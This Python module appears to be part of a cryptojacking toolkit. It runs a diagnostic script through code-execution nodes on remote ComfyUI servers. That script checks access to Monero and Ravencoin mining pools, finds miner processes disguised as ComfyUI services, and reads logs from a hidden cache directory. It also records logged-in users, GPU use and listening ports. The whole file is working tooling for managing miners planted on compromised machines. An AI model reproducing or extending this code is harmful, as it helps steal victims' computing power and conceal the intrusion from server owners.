"""
Deep diagnostics — DNS resolution, network connectivity, process inspection,
GPU status, miner logs, session detection, and listening ports.
"""

from __future__ import annotations
from typing import Callable

from . import executor
from .discovery import ServerProfile

LOG_CB = Callable[[str], None]

DIAG_CODE = r'''import subprocess, os, json, socket

lines = []

# ── 1. DNS resolution ──
lines.append("=== DNS ===")
pools = [
    ("pool.hashvault.pro", 80),
    ("pool.hashvault.pro", 443),
    ("gulf.moneroocean.stream", 10001),
    ("rvn.2miners.com", 6060),
]
for host, port in pools:
    try:
        ip = socket.getaddrinfo(host, None, socket.AF_INET)[0][4][0]
        lines.append(f"  {host} -> {ip}")
    except Exception as e:
        lines.append(f"  {host} -> FAIL: {e}")

# ── 2. /etc/hosts blocklist ──
lines.append("=== /etc/hosts blocks ===")
try:
    with open("/etc/hosts") as f:
        hosts = f.read()
    blocked = [l.strip() for l in hosts.splitlines()
               if "0.0.0.0" in l and any(k in l for k in ["miner", "pool", "2miners", "moneroocean", "unmineable", "nicehash", "hashvault"])]
    lines.append(f"  Blocked entries: {len(blocked)}")
    for b in blocked[:10]:
        lines.append(f"    {b}")
except Exception as e:
    lines.append(f"  Cannot read /etc/hosts: {e}")

# ── 3. TCP connectivity ──
lines.append("=== TCP Connectivity ===")
for host, port in pools:
    r = subprocess.run(["timeout", "5", "bash", "-c", f"echo | nc -w3 {host} {port}"],
                       capture_output=True, text=True, timeout=10)
    status = "OK" if r.returncode == 0 else f"FAIL (exit={r.returncode})"
    lines.append(f"  {host}:{port} -> {status}")

# ── 4. Processes ──
lines.append("=== Miner Processes ===")
r2 = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=10)
for l in r2.stdout.splitlines():
    ll = l.lower()
    if any(k in ll for k in ["comfyui_service", "comfyui_render", "xmrig", "t-rex", "trex", "lolminer"]):
        lines.append(f"  {l.strip()[:180]}")

# ── 5. GPU ──
lines.append("=== GPU ===")
try:
    r3 = subprocess.run(["nvidia-smi", "--query-gpu=index,name,temperature.gpu,utilization.gpu,memory.used,memory.total,power.draw",
                          "--format=csv,noheader"], capture_output=True, text=True, timeout=10)
    if r3.returncode == 0:
        for gl in r3.stdout.strip().splitlines():
            lines.append(f"  {gl.strip()}")
    else:
        lines.append("  nvidia-smi failed")
except Exception:
    lines.append("  nvidia-smi not available")

# ── 6. Miner logs ──
uid = os.getuid() if hasattr(os, "getuid") else 1000
cache = "/var/tmp/.comfyui_cache" if uid == 0 else os.path.expanduser("~/.local/share/.comfyui_cache")

for logname in ["service.log", "render.log"]:
    logpath = os.path.join(cache, logname)
    lines.append(f"=== {logname} (last 15 lines) ===")
    if os.path.isfile(logpath):
        with open(logpath) as f:
            content = f.read()
        tail = content.strip().splitlines()[-15:]
        for tl in tail:
            lines.append(f"  {tl[:180]}")
    else:
        lines.append(f"  {logpath} not found")

# ── 7. Sessions ──
lines.append("=== Active Sessions ===")
r4 = subprocess.run(["who"], capture_output=True, text=True, timeout=5)
who = r4.stdout.strip()
lines.append(f"  who: {who if who else '(none)'}")

# ── 8. ComfyUI WebSocket clients ──
lines.append("=== ComfyUI WS Clients ===")
try:
    from server import PromptServer
    lines.append(f"  PromptServer sockets: {len(PromptServer.instance.sockets)}")
except Exception:
    lines.append("  Cannot access PromptServer")

# ── 9. Queue ──
lines.append("=== ComfyUI Queue ===")
try:
    import urllib.request as ur
    rr = ur.urlopen("http://127.0.0.1:8188/queue", timeout=5)
    q = json.loads(rr.read())
    lines.append(f"  running={len(q.get('queue_running', []))}, pending={len(q.get('queue_pending', []))}")
except Exception as e:
    lines.append(f"  Queue check failed: {e}")

# ── 10. Listening ports ──
lines.append("=== Key Listening Ports ===")
r5 = subprocess.run(["ss", "-tlnp"], capture_output=True, text=True, timeout=5)
for sl in r5.stdout.splitlines():
    if any(p in sl for p in [":4067 ", ":44880 ", ":8188 ", ":80 ", ":443 "]):
        lines.append(f"  {sl.strip()}")

return "\n".join(lines)
'''


def _log(cb: LOG_CB | None, msg: str):
    if cb:
        cb(msg)


def diagnose(profile: ServerProfile, log: LOG_CB | None = None) -> str:
    """Run full diagnostics on a server. Returns the raw output text."""
    if not profile.reachable or not profile.all_exec_nodes:
        msg = f"Cannot diagnose {profile.ip} — unreachable or no exec nodes"
        _log(log, msg)
        return msg

    _log(log, f"Running diagnostics on {profile.ip} ...")
    result = executor.execute(profile, DIAG_CODE, log=log, timeout=45)

    if not result:
        _log(log, "  No diagnostic output")
        return "No output from diagnostic script"

    for line in result.strip().splitlines():
        _log(log, line)

    return result
